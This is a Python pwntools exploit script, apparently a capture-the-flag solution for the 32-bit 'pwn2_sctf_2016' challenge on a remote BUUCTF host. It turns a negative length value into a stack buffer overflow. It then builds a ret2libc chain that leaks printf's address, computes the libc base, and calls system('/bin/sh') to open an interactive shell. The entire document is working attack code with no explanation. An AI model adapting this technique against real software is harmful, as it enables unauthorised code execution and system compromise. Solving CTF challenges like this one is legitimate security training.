from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('node4.buuoj.cn', 26660)
elf = ELF('./pwn2_sctf_2016')
main_addr = elf.symbols['main']
printf_plt = elf.plt['printf']
printf_got = elf.got['printf']
io.sendlineafter(b'How many bytes do you want me to read? ', b'-1')
payload = b'a'*(0x2c+0x4) + flat([printf_plt, main_addr, printf_got])
io.recvline() # Ok, sounds good. Give me 4294967295 bytes of data!
io.sendline(payload)
io.recvline()
printf_addr = u32(io.recv(4))
log.info('printf_address => %s', hex(printf_addr))
libc = ELF('./libc_32.so.6')
libcbase = printf_addr - libc.symbols['printf']
log.success('printf_address => %s', hex(printf_addr))
system_addr = libcbase + libc.symbols['system']
log.info('system_address => %s', hex(system_addr))
bin_sh_addr = libcbase + libc.search(b'/bin/sh').__next__()
log.info('bin_sh_address => %s', hex(bin_sh_addr))
io.sendlineafter(b'How many bytes do you want me to read? ', b'-1')
payload = b'a'*(0x2c+0x4) + flat([system_addr, main_addr, bin_sh_addr])
io.recvline() # Ok, sounds good. Give me 4294967295 bytes of data!
io.sendline(payload)
io.interactive()